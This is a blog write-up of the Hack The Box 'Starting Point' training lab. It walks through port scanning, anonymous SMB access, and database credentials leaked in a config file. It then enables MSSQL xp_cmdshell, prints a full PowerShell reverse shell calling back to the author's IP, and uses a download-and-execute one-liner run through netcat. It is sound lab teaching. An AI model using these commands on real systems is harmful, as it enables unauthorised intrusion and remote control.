---
layout: post
title: "[Hack the Box] Starting Point"
categories: Write-up
---
```bash
[*] environment : Kali Linux 19.04
[*] target IP : 10.10.10.27 
```

**Please hack the machine with Kali Linux 19.04. No 20.04. plsss**

Recently, I registered "Hack The Box" site for studying real hacking. Starting Point is the tutorial problem.



## Port scanning

First we scan the port of target IP, 10.10.10.27. We use `nmap` for port scanning.

**Nmap**(Network Mapper) is network exploration tool and security / port scanner. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, etc.

For example, if unnecessary port is open, we can use it for exploit.

```bash
$ nmap -sC -sV 10.10.10.27
```

- `-sC` : equivalent to --script=default
- `-sV` : Probe open ports to determine service/version info

![image](https://user-images.githubusercontent.com/64528476/89916173-48700d80-dc32-11ea-990f-12c948d2f142.png)

We can see that Ports 445 and 1433 are open, which are associated with file sharing (SMB) and SQL Server.



**SMB**(Server Message Block) is a communication protocol for providing shared access to files, printers, and serial ports between nodes on a network.

We use `smbclient` to list available shares in SMB.

```bash
$ smbclient -N -L //10.10.10.27/
```

- `-N` : No password. If service does not have password, we can access.
- `-L` : Look at what services are available on a server.

![image](https://user-images.githubusercontent.com/64528476/89918597-32178100-dc35-11ea-95ce-7149f8decaea.png)



I tried to access all folder and succeed to get in the backups folder.

```bash
$ smbclient -N //10.10.10.27/backups
```

There are `prod.dtsConfig` file, so I download to my local.

![image](https://user-images.githubusercontent.com/64528476/89919630-7bb49b80-dc36-11ea-9938-5684eb3164e2.png)

**A DTSCONFIG file** is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of metadata such as the server name, database names, and other connection properties to configure SSIS packages.

<img src="https://user-images.githubusercontent.com/64528476/89996423-b9acd080-dcc5-11ea-8cbd-53198ff092c6.png" alt="image"/>

We can some password! We should try to connect SQL Server. I used [Impacket](https://github.com/SecureAuthCorp/impacket)'s `mssqlclient.py`  to connect server.

![image](https://user-images.githubusercontent.com/64528476/90032938-dfec6380-dcf9-11ea-91b9-0cef48622433.png)

Succeed to connect Server! I can indicate whether a SQL Server login is a member of the specified server role by `IS_SRVROLEMEMBER` function. [IS_SRVROLEMEMBER (Transact-SQL)](https://docs.microsoft.com/ko-kr/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)

![image](https://user-images.githubusercontent.com/64528476/90039601-d535cc80-dd01-11ea-9e92-bb05b15ffb8a.png)

It means this account is a member of 'sysadmin'. We have sysadmin privileges! WOW. We'll activate `xp_cmdshell` for RCE(Remote Code Execution). 

**xp_cmdshell** is the function for executing OS command in MSSQL.

Let's activate `xp_cmdshell`.

```mssql
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

Now we can input the OS command.

![image](https://user-images.githubusercontent.com/64528476/90041610-8178b280-dd04-11ea-800d-228cd0952eae.png)

<br>
Save the Powershell reverse shell as `shell.ps1`. **Someday I'll explain Reverse shell.**

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.14",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
```

`10.10.14.14` is my IP in HackTheBox. (Check with `ifconfig`)


<br>
### Our Plan

![image](https://user-images.githubusercontent.com/64528476/90042813-25af2900-dd06-11ea-89d4-29173006e165.png)

Source : https://klonic.tistory.com/138?category=899632

1. In MSSQL Server, request `shell.ps1` by using `xp_cmdshell`.

2. Return `shell.ps1` to MSSQL Server.

3. By `shell.ps1`, MSSQL Server connected by netcat.



Stand up a mini webserver in order to host the file.

```bash
$ python3 -m http.server 80 --bind 10.10.14.14
```

Stand up a netcat listener on port 443.

```bash
$ nc -lvnp 443
```

- `-l` : listen mode, for inbound connects.
- `-v` : get more information
- `-n` : numeric-only IP addresses, no DNS
- `-p` : port number



In MSSQL, download `shell.ps1` from my ip and execute that script! We GET THE SHELL!!

```mssql
SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.14/shell.ps1\");" 
```

![image](https://user-images.githubusercontent.com/64528476/90046142-036bda00-dd0b-11ea-91fc-09373b048a73.png)



I can find the user flag in Desktop.

![image](https://user-images.githubusercontent.com/64528476/90046919-1632de80-dd0c-11ea-8105-909210824ea7.png)

<br>


I found the access log in here.

![image](https://user-images.githubusercontent.com/64528476/90047351-bd177a80-dd0c-11ea-8381-58b5408e9f68.png)

We get the password of administrator! We can use Impacket's psexec.py to gain a privileged shell.

![image](https://user-images.githubusercontent.com/64528476/90047992-ca813480-dd0d-11ea-8d5c-21bf13df9761.png)

I found the root flag in Desktop.

![image](https://user-images.githubusercontent.com/64528476/90048185-1fbd4600-dd0e-11ea-8820-cdeb39b8a127.png)

<br>


Tutorial is f**king hard..